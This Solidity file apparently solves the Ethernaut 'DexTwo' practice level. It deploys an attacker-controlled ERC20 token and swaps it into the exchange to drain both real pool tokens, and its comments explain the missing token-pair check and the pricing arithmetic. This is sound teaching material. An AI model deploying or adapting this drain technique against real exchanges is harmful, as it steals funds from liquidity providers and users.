// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IDexTwo {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

/**
 * @title MaliciousToken
 * @dev A simple ERC20 token used to exploit DexTwo
 */
contract MaliciousToken is ERC20 {
    constructor() ERC20("Malicious Token", "MAL") {
        // Mint 400 tokens to the deployer
        // We need 200 total (100 for each drain)
        // But we also give 100 to DexTwo to manipulate the price
        _mint(msg.sender, 400 * 10**decimals());
    }
}

/**
 * @title DexTwoExploit
 * @dev Solution contract for Ethernaut Level 23 - DexTwo
 * 
 * This contract exploits the DexTwo contract by using a malicious token to drain funds.
 * 
 * The vulnerability in DexTwo:
 * - The swap function REMOVED the token validation check!
 * - Original Dex had: require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
 * - DexTwo removed this check, allowing ANY token to be swapped!
 * 
 * Attack Strategy:
 * 1. Deploy a malicious ERC20 token that we fully control
 * 2. Give ourselves plenty of malicious tokens (e.g., 400)
 * 3. Transfer 100 malicious tokens to DexTwo
 * 4. Swap 100 malicious tokens for ALL 100 token1
 *    - Price: (100 * 100) / 100 = 100 token1 ✓
 * 5. Swap 100 malicious tokens for ALL 100 token2
 *    - Price: (100 * 100) / 100 = 100 token2 ✓
 * 6. Both token1 and token2 are completely drained!
 * 
 * Why this works:
 * - We control the supply and distribution of our malicious token
 * - We can set up the perfect ratio (1:1) to drain exactly all tokens
 * - DexTwo doesn't validate that we're swapping the correct token pair
 * - The price formula still works, but we manipulate the "from" token balance
 * 
 * Price Formula Analysis:
 * swapAmount = (amount * toBalance) / fromBalance
 * 
 * For token1 drain:
 * - from = maliciousToken, to = token1
 * - DexTwo has: 100 malicious, 100 token1
 * - We swap: 100 malicious
 * - We get: (100 * 100) / 100 = 100 token1 ✅ (ALL of it!)
 * 
 * For token2 drain:
 * - from = maliciousToken, to = token2
 * - DexTwo has: 200 malicious (from first swap), 100 token2
 * - We swap: 100 malicious
 * - We get: (100 * 100) / 200 = 50 token2 ❌ (Not enough!)
 * 
 * WAIT! We need to adjust our strategy:
 * After draining token1, DexTwo will have 200 malicious tokens.
 * To drain ALL token2, we need to calculate the exact amount:
 * 
 * We want: swapAmount = 100 (all token2)
 * Formula: (amount * 100) / 200 = 100
 * Solving: amount = 200
 * 
 * But we only have 100 malicious left after first swap!
 * 
 * BETTER STRATEGY:
 * Don't give DexTwo 100 malicious tokens. Give it less!
 * 
 * Let's give DexTwo exactly 1 malicious token initially:
 * - DexTwo: 1 malicious, 100 token1, 100 token2
 * 
 * Swap 1: Drain token1
 * - We swap: 1 malicious for token1
 * - We get: (1 * 100) / 1 = 100 token1 ✅
 * - DexTwo now has: 2 malicious, 0 token1, 100 token2
 * 
 * Swap 2: Drain token2
 * - We swap: 2 malicious for token2
 * - We get: (2 * 100) / 2 = 100 token2 ✅
 * - DexTwo now has: 4 malicious, 0 token1, 0 token2 ✅
 * 
 * Perfect! Both tokens drained with minimal malicious tokens!
 */
contract DexTwoExploit {
    address public dex;
    address public token1;
    address public token2;
    address public maliciousToken;
    address public owner;

    event ExploitStep(string description, uint256 maliciousBalance, uint256 token1Balance, uint256 token2Balance);

    constructor(address _dex) {
        dex = _dex;
        owner = msg.sender;
        token1 = IDexTwo(dex).token1();
        token2 = IDexTwo(dex).token2();
        
        // Deploy our malicious token
        maliciousToken = address(new MaliciousToken());
    }

    /**
     * @dev Execute the complete exploit to drain both token1 and token2
     * Uses a malicious token to manipulate prices
     */
    function exploit() external {
        require(msg.sender == owner, "Not the owner");
        
        MaliciousToken mal = MaliciousToken(maliciousToken);
        
        // Transfer 1 malicious token to DexTwo to set up the ratio
        mal.transfer(dex, 1);
        emit ExploitStep(
            "Setup: Transferred 1 malicious token to DexTwo",
            IERC20(maliciousToken).balanceOf(dex),
            IERC20(token1).balanceOf(dex),
            IERC20(token2).balanceOf(dex)
        );
        
        // Approve DexTwo to spend our malicious tokens
        mal.approve(dex, type(uint256).max);
        
        // Drain token1
        // DexTwo has: 1 malicious, 100 token1
        // Swap 1 malicious for (1 * 100) / 1 = 100 token1
        IDexTwo(dex).swap(maliciousToken, token1, 1);
        emit ExploitStep(
            "Swap 1: Drained all token1",
            IERC20(maliciousToken).balanceOf(dex),
            IERC20(token1).balanceOf(dex),
            IERC20(token2).balanceOf(dex)
        );
        
        // Drain token2
        // DexTwo has: 2 malicious, 0 token1, 100 token2
        // Swap 2 malicious for (2 * 100) / 2 = 100 token2
        IDexTwo(dex).swap(maliciousToken, token2, 2);
        emit ExploitStep(
            "Swap 2: Drained all token2",
            IERC20(maliciousToken).balanceOf(dex),
            IERC20(token1).balanceOf(dex),
            IERC20(token2).balanceOf(dex)
        );
        
        emit ExploitStep(
            "Exploit complete! Both tokens drained!",
            IERC20(maliciousToken).balanceOf(dex),
            IERC20(token1).balanceOf(dex),
            IERC20(token2).balanceOf(dex)
        );
    }

    /**
     * @dev Alternative exploit using initial transfer of 100 malicious tokens
     * This demonstrates a different approach with different math
     */
    function exploitAlternative() external {
        require(msg.sender == owner, "Not the owner");
        
        MaliciousToken mal = MaliciousToken(maliciousToken);
        
        // Transfer 100 malicious tokens to DexTwo
        mal.transfer(dex, 100);
        
        // Approve DexTwo to spend our malicious tokens
        mal.approve(dex, type(uint256).max);
        
        // Drain token1
        // DexTwo has: 100 malicious, 100 token1
        // Swap 100 malicious for (100 * 100) / 100 = 100 token1
        IDexTwo(dex).swap(maliciousToken, token1, 100);
        
        // Drain token2
        // DexTwo has: 200 malicious, 0 token1, 100 token2
        // Swap 200 malicious for (200 * 100) / 200 = 100 token2
        IDexTwo(dex).swap(maliciousToken, token2, 200);
    }

    /**
     * @dev Check current balances
     */
    function checkBalances() external view returns (
        uint256 exploitMalicious,
        uint256 exploitToken1,
        uint256 exploitToken2,
        uint256 dexMalicious,
        uint256 dexToken1,
        uint256 dexToken2
    ) {
        exploitMalicious = IERC20(maliciousToken).balanceOf(address(this));
        exploitToken1 = IERC20(token1).balanceOf(address(this));
        exploitToken2 = IERC20(token2).balanceOf(address(this));
        dexMalicious = IERC20(maliciousToken).balanceOf(dex);
        dexToken1 = IERC20(token1).balanceOf(dex);
        dexToken2 = IERC20(token2).balanceOf(dex);
    }

    /**
     * @dev Get the malicious token address
     */
    function getMaliciousToken() external view returns (address) {
        return maliciousToken;
    }

    /**
     * @dev Withdraw tokens to owner (for cleanup)
     */
    function withdraw(address token) external {
        require(msg.sender == owner, "Not the owner");
        uint256 balance = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(owner, balance);
    }
}
